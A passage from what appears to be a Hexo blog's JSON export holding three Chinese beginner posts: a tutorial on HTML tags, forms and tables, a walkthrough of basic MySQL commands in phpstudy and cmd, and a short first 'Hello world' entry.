href=&quot;https://www.baidu.com/&quot;&gt;百度一下&lt;/a&gt; html除了现有属性，还有自定义属性： &lt;a href=&quot;https://www.baidu.com/&quot; data-wm=&quot;pdsu.cn&quot;&gt;百度一下&lt;/a&gt; 属性名在html5里面加data-作为前缀后接一个或多个字母，属性值随便写，自定义属性默认不会对页面展示造成任何影响。 4、html元素定义：从开始标签到结束标签所有代码。html元素内容：从开始标签到结束标签之间的内容。html元素分为：块级元素和内联元素块级元素：占页面整行长度 &lt;div&gt;&lt;/div&gt;内联元素：只占元素内容长度 &lt;span&gt;&lt;/span&gt;5、html注释 &lt;!-- 被注释的内容 --&gt; 为了给写代码的人看的。 6、html编码非数字的进行编码。 （1）设置html文档所在文件编码（2）在html文档中用标签指定浏览器使用某编码进行展示网页（指定与html文件的编码相对应的编码即可) ==文件编码为utf-8在html中标签指定utf-8编码展示网页== ==文件编码为ansi在html中标签指定jb2312编码展示网页==常用编码：utf-8或jb2312 &lt;head&gt; &lt;!-- 声明：utf-8国际编码 gbk jb2312中文编码 --&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;title&gt;页面标题&lt;/title&gt; &lt;/head&gt; 7、html常用标签1、水平线单纯水平线：&lt;hr /&gt; 类型：单标签 2、主题内容中的标题 &lt;h1&gt;&lt;/h1&gt; &lt;!--一级标题--&gt; &lt;h2&gt;&lt;/h2&gt; &lt;!--二级标题--&gt; &lt;h3&gt;&lt;/h3&gt; &lt;!--三级标题--&gt; &lt;h4&gt;&lt;/h4&gt; &lt;!--四级标题--&gt; &lt;h5&gt;&lt;/h5&gt; &lt;!--五级标题--&gt; &lt;h6&gt;&lt;/h6&gt; &lt;!--六级标题--&gt; 类型：双标签 3、段落&lt;p&gt;&lt;/p&gt; 类型：双标签 4、换行&lt;br /&gt; 类型：单标签 5、空格（1）&amp;nbsp 不是标签，可以当做特殊字符。 （2）输入法用全角 6、无序列表 &lt;!-- 列表需要嵌套写法 --&gt; &lt;ul&gt; ​ &lt;li&gt;&lt;/li&gt; ​ &lt;li&gt;&lt;/li&gt; &lt;/ul&gt; 7、有序列表 &lt;ol&gt; ​ &lt;li&gt;&lt;/li&gt; ​ &lt;li&gt;&lt;/li&gt; &lt;/ol&gt; 子元素，父元素，后代元素，兄弟元素 8、定义列表 &lt;dl&gt; ​ &lt;dt&gt;&lt;/dt&gt; ​ &lt;dd&gt; ​ &lt;/dd&gt; &lt;/dl&gt; 类型：块级元素 9、插入图片 &lt;img src=&quot;&quot; alt=&quot;&quot; width=&quot;&quot; height=&quot;&quot; /&gt; 属性src里填图片路径图片路径分为：绝对路径和相对路径&lt;!--相对路径：相对于当前html文件路径--&gt; ==./当前目录../上一级目录====在当前目录建一个文件夹：images 将所展示图片都放在里面== 属性alt里填图片说明属性width里填图片长度：也可以用百分比表示属性height里填图片高度：也可以用百分比表示类型：内联元素实例 &lt;img src=&quot;images/1.jpg&quot; alt=&quot;二哈&quot; width=&quot;200&quot; height=&quot;100&quot;/&gt; 10、超链接 &lt;a href=&quot;https://www.baidu.com/&quot; title=&quot;鼠标悬停显示&quot; target=&quot;_blank&quot;&gt;百度一下&lt;/a&gt; 属性href：需要连接的网址，网站建设初期用#链接表示空链接 属性title：鼠标悬停显示 属性target：设置_blank，在新窗口打开链接地址 类型：内联元素 11、指定图片某块区域加超链接（1）为map标签加上id属性，定义一个唯一属性（2）为保证兼容性加name属性，属性值与id值相同（3）为map标签所作用图片img标签加usemap属性，属性名为#id名称（4）在map标签内嵌套area标签实现给指定区域加链接 &lt;area shape=&quot;&quot; coords=&quot;&quot; href=&quot;&quot; alt=&quot;&quot; /&gt; 属性shape：定义链接区域形状，常用值rect（矩形）circle（圆形）属性coords：确定区域精确位置，填坐标&lt;!--以左上角为原点--&gt;属性href：链接地址属性alt：链接说明 12、link标签放置在头标签head内的用于链接外部css文件、链接收藏夹图标（favicon.ico）最常见用途：链接外部样式表 属性href 值为外部资源地址，这里是css地址属性rel 定义当前文档与被链接文档之间关系，值为icon、stylesheet、next、help、author、alternate、licence、search、tag、prev、sidebar这里是外部css样式 即stylesheet属性type 规定被链接文档MIME类，值为text/css 13、div容器div标签可以看成存放标签的容器 类型：块级元素 14、span内联元素组合内联元素，以便css美化 15、表格实例 &lt;table border=&quot;1&quot; cellpadding=&quot;2&quot; cellspacing=&quot;1&quot;&gt; ​ &lt;tr&gt; ​ &lt;th&gt;姓名&lt;/th&gt; ​ &lt;th&gt;学号&lt;/th&gt; ​ &lt;th&gt;年龄&lt;/th&gt; ​ &lt;th&gt;成绩&lt;/th&gt; ​ &lt;/tr&gt; ​ &lt;tr&gt; ​ &lt;td&gt;小王&lt;/td&gt; ​ &lt;td&gt;133&lt;/td&gt; ​ &lt;td&gt;19&lt;/td&gt; ​ &lt;td&gt;100&lt;/td&gt; ​ &lt;/tr&gt; &lt;/table&gt; table标签属性：border 作用：规定表格边框宽度属性：cellpadding 作用：规定文字和边框的间距属性：cellspacing 作用：规定每个单元格边框宽度tr标签：html表格中的行th标签：表格内表头单元格td标签：表格内普通单元格常用属性：colspan：规定单元格可横跨列数，值为数字rowspan：规定单元格可横跨行数，值为数字 16、表单表单提交实例1 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;title&gt;html表单提交&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;账户登录&lt;/h1&gt; &lt;form name=&quot;submit&quot; action=&quot;https://www.baidu.com/&quot; target=&quot;_blank&quot; method=&quot;get&quot;&gt; &lt;!-- 由于表单提交需要进行数据处理，html语言无法实现，暂且写成向百度提交数据 --&gt; 账号：&lt;input name=&quot;text&quot; type=&quot;text&quot; size=&quot;20&quot; /&gt; &lt;br /&gt; 密码：&lt;input name=&quot;password&quot; type=&quot;password&quot; size=&quot;20&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; value=&quot;确认登录&quot; /&gt; &amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp &amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp &lt;input type=&quot;reset&quot; value=&quot;清空&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 1、标签&lt;form&gt;：定义供用户输入的html表单属性：action：规定提交表单向何处发送表单数据name：表单命名target：_blank在新窗口打开method：提交方式，get或post值类型：双标签 2、&lt;input&gt;标签:定义表单输入页面&lt;!-- 通过type属性展示不同输入页面，通过value改变默认值 --&gt;（1）普通文本框： &lt;input type=&quot;text&quot; /&gt; （2）密码框： &lt;input type=&quot;password&quot; /&gt; （3）文件上传： &lt;input type=&quot;file&quot; /&gt; （4）隐藏的input： &lt;input type=&quot;hidden&quot; /&gt; （5）普通按钮： &lt;input type=&quot;button&quot; /&gt; （6）单选：&lt;input type=&quot;radio&quot; /&gt; &lt;!--通过相同name属性实现单选--&gt; 实例 &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;男&lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;女 （7）复选框： &lt;input type=&quot;checkbox&quot; /&gt; （8）提交： &lt;input type=&quot;submit&quot; /&gt; （9）重置： &lt;input type=&quot;reset&quot; /&gt; 属性placeholder 可用值text：规定帮助用户填写输入字段提示属性checked 可用值checked：用于选择页面（单复选），实现默认选择属性disabled 可用值disabled：使标签不可用属性name：给input输入界面起名字属性readonly 可用值readonly ：使输入界面为只读状态属性size 值为数字：设置输入框长度属性value：该属性值为input提交到页面的数据，可通过该属性设置默认值 3、textarea标签：定义多行输入框 &lt;!--双标签，默认值写标签之间--&gt; 属性cols 值为数字属性rows 值为数字也可使用disabled name readonly属性实例 自我介绍：&lt;textarea cols=&quot;20&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt; 4、label标签：提升用户体验标签for属性与input的id属性相同 5、select标签：配合option实现下拉菜单可用属性：disabled name multiple &lt;select&gt; ​ &lt;option&gt;&lt;/option&gt; &lt;/select&gt; 6、option标签可用属性：disabled select value 7、optgroup标签 &lt;!--把相关选项组合在一起--&gt; 属性label：给选项组命名属性disabled：停用该选项组实例 &lt;select&gt; &lt;optgroup label=&quot;河南省&quot;&gt; ​ &lt;option value=&quot;周口&quot;&gt;周口&lt;/option&gt; &lt;option&gt;郑州&lt;/option&gt; &lt;option&gt;洛阳&lt;/option&gt; &lt;/optgroup&gt; &lt;/select&gt; 表单提交实例2 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;link rel=&quot;icon&quot; href=&quot;../../favicon.ico&quot;&gt; &lt;title&gt;表单提交练习&lt;/title&gt; &lt;link href=&quot;https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; /&gt; &lt;link href=&quot;../../assets/css/ie10-viewport-bug-workaround.css&quot; rel=&quot;stylesheet&quot; /&gt; &lt;link href=&quot;signin.css&quot; rel=&quot;stylesheet&quot; /&gt; &lt;script src=&quot;../../assets/js/ie-emulation-modes-warning.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;container&quot;&gt; &lt;form class=&quot;form-signin&quot; name=&quot;submit&quot; target=&quot;_blank&quot; method=&quot;get&quot;&gt; &lt;h2 class=&quot;form-signin-heading&quot;&gt;表单提交&lt;/h2&gt; &lt;input type=&quot;text&quot; id=&quot;inputText&quot; class=&quot;form-control&quot; placeholder=&quot;text&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;password&quot; id=&quot;inputPassword&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; /&gt; &lt;br /&gt; &lt;input class=&quot;btn btn-lg btn-primary btn-block&quot; type=&quot;submit&quot; value=&quot;立即提交&quot; /&gt; &lt;/form&gt; &lt;/div&gt; &lt;script src=&quot;../../assets/js/ie10-viewport-bug-workaround.js&quot;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt;","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://qwzf.github.io/categories/编程开发/"},{"name":"前端","slug":"编程开发/前端","permalink":"https://qwzf.github.io/categories/编程开发/前端/"}],"tags":[{"name":"Web前端","slug":"Web前端","permalink":"https://qwzf.github.io/tags/Web前端/"},{"name":"HTML","slug":"HTML","permalink":"https://qwzf.github.io/tags/HTML/"}],"author":"qwzf"},{"title":"phpstudy-MySQL的简单使用以及cmd打开MySQL","slug":"phpstudy-MySQL基础篇一","date":"2019-03-15T15:39:20.232Z","updated":"2020-08-01T15:46:35.234Z","comments":true,"path":"2019/03/15/phpstudy-MySQL基础篇一/","link":"","permalink":"https://qwzf.github.io/2019/03/15/phpstudy-MySQL基础篇一/","excerpt":"","text":"今天尝试学习使用phpstudy中的mysql，让我受益颇深。所以把学习和练习过程记录了一下，首先是数据库的创建，其次是在MySQL命令行对数据增、删、改、查的练习，最后是用cmd打开phpstudy中的MySQL，以及增删改查练习。要注意的是，phpstudy中默认账户密码都是root，只在文件中把密码改了是没有用的。在此之前，我们需要了解一下什么是数据库和mysql。数据库就是存储数据的仓库，其本质是一个文件系统，数据按照特定的格式将数据存储起来，用户可以对数据库中的数据进行增加，修改，删除及查询操作。mysql是一种关系数据库管理系统，关系数据库将数据保存在不同的表中，提高了灵活性。使用的语言是SQL语言。 1、创建数据库（1）打开MySQL-Front发现这里自带前端可视化界面。然后我开始对数据库进行创建。 （2）创建、删除数据库首先，创建一个数据库名为mydata的数据库（或者是在MySQL命令行中输入create database 数据库名称；） mysql&gt; create database mydata; Query OK, 1 row affected (0.01 sec) 如果删除该数据库，在这里可进行删除（或者是在MySQL命令行中输入drop database 数据库名称；） mysql&gt; drop database mydata; Query OK, 0 rows affected (0.00 sec) （3）创建、删除数据表创建一个数据表名为users的数据表格（或者是在MySQL命令行中输入create table 表名 ( id int ,name varchar(35),password varchar(40)); 其中 id name password 是字段 ,后面的限制是类型。） mysql&gt; use mydata; Database changed mysql&gt; create table users(Id int,text varchar(35),password varchar(40)); Query OK, 0 rows affected (0.01 sec) 如果删除该数据表，在这里可进行删除（或者是在MySQL命令行中输入drop table 表名；） mysql&gt; drop table users; Query OK, 0 rows affected (0.00 sec) 然后类似的，再进行字段的创建。创建好之后，由对象浏览器转换到数据浏览器，输入相关数据就完整创建了一个数据库。如下： 2、通过MySQL命令行对数据增、删、改、查首先，打开MySQL命令行，输入默认密码root （1）选择数据库选择使用哪个数据库，这里选择使用的是mydata数据库 mysql&gt; use mydata; Database changed （2）数据的增、删、改、查1.增原先，没有“id=6，text=‘qwzf’，password=‘qwzf’”这条记录，通过sql语句在数据库的表格中添加了这条记录。（或者是alter table 表名 add 字段名称+字段类型；） 2.删 mysql&gt; delete from users where id=5; Query OK, 1 row affected (0.00 sec) 这里删除了在表格users中id=5的那条记录。（或者是alter table 表名 drop 字段名字；） 3.改如果要改表名，则在MySQL命令行输入alter table 原表名 rename 新的名字；如果要修改字段，则在MySQL命令行输入alter table 表名 change 原来的字段名称 修改后的字段名称；（或者是update 表名 set 字段=‘数据’ where 范围;）在id=4的那条记录中，字段text下的数据“php”被更新修改成“him” 4.查1.查库在命令行想看所有的数据库，这就用到了show databases；（注意：在mysql语句中，一句话写完必须加分号。且mysql语句中不区分大小写） mysql&gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mydata | | myl | | myphp | | myphp2 | | mysql | | performance_schema | | test | +--------------------+ 8 rows in set (0.01 sec) 2.查表在命令行想看mydata数据库中所有表，这就用到了show tables； mysql&gt; show tables; +------------------+ | Tables_in_mydata | +------------------+ | users | +------------------+ 1 row in set (0.00 sec) 在命令行想看users表中所有数据，这就用到了select*from 表名； mysql&gt; select*from users; +----+-------+----------+ | Id | text | password | +----+-------+----------+ | 1 | admin | admin | | 2 | root | root | | 3 | wang | wang | | 4 | him | php | | 6 | qwzf | qwzf | +----+-------+----------+ 5 rows in set (0.00 sec) 3.查字段在命令行想看users表中在一定范围的字段,select*from 表名 where 范围； mysql&gt; select*from users where id=1; +----+-------+----------+ | Id | text | password | +----+-------+----------+ | 1 | admin | admin | +----+-------+----------+ 1 row in set (0.00 sec) mysql&gt; select*from users where text=&#39;qwzf&#39;; +----+------+----------+ | Id | text | password | +----+------+----------+ | 6 | qwzf | qwzf | +----+------+----------+ 1 row in set (0.00 sec) mysql&gt; select*from users where password=&#39;wang&#39;; +----+------+----------+ | Id | text | password | +----+------+----------+ | 3 | wang | wang | +----+------+----------+ 1 row in set (0.00 sec) 4.查看表结构在命令行想看users表的表结构，用desc 表名； mysql&gt; desc users; +----------+--------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +----------+--------------+------+-----+---------+----------------+ | Id | int(11) | NO | PRI | NULL | auto_increment | | text | varchar(255) | YES | | NULL | | | password | varchar(255) | YES | | NULL | | +----------+--------------+------+-----+---------+----------------+ 3 rows in set (0.00 sec) 3、用cmd打开phpstudy中的MySQL首先，打开cmd命令行页面。如果计算机是Windows10操作系统，输入Windows+R，打开windows运行搜索框，输入cmd回车，打开cmd命令行页面。然后在电脑上找到phpstudy所在目录。1.返回上一级目录cd\\ 2.进入下一级目录cd+空格+目录名下面是我在cmd命令行中打开phpstudy中MySQL的过程： C:\\Users\\ASUS&gt;cd\\ // 返回上一级目录 C:\\&gt;cd phpstudy //进入下一级目录 C:\\phpStudy&gt;cd PHPTutorial C:\\phpStudy\\PHPTutorial&gt;cd MySQL C:\\phpStudy\\PHPTutorial\\MySQL&gt;cd bin C:\\phpStudy\\PHPTutorial\\MySQL\\bin&gt;mysql -u root -p Enter password: **** Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 4 Server version: 5.5.53 MySQL Community Server (GPL) Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement. mysql&gt; 用cmd打开mysql后，增、删、改、查过程与直接在phpstudy通过MySQL命令行对数据增、删、改、查，过程相同。可参照上面的直接通过MySQL命令行对数据增、删、改、查过程。本人小白一枚，如有个别错误，敬请大佬指正。","categories":[{"name":"工具学习","slug":"工具学习","permalink":"https://qwzf.github.io/categories/工具学习/"},{"name":"phpstudy","slug":"工具学习/phpstudy","permalink":"https://qwzf.github.io/categories/工具学习/phpstudy/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://qwzf.github.io/tags/Web/"},{"name":"数据库","slug":"数据库","permalink":"https://qwzf.github.io/tags/数据库/"}],"author":"qwzf"},{"title":"Hello world","slug":"hello-world","date":"2019-03-12T14:33:11.959Z","updated":"2020-08-01T15:02:50.237Z","comments":true,"path":"2019/03/12/hello-world/","link":"","permalink":"https://qwzf.github.io/2019/03/12/hello-world/","excerpt":"","text":"第一篇第一次搭这个Hexo个人博客，忙了许久，总算搭好了。在搭的过程中，竟然没有踩坑，真好。 于是我便迫不及待的先写下这个 blog试试效果怎么样。 现在看起来效果还不错，希望我能再接再厉，努力学习，并且写出好的blog。从现在开始我的小白进阶之旅！！！","categories":[{"name":"First","slug":"First","permalink":"https://qwzf.github.io/categories/First/"}],"tags":[],"author":"qwzf"}]}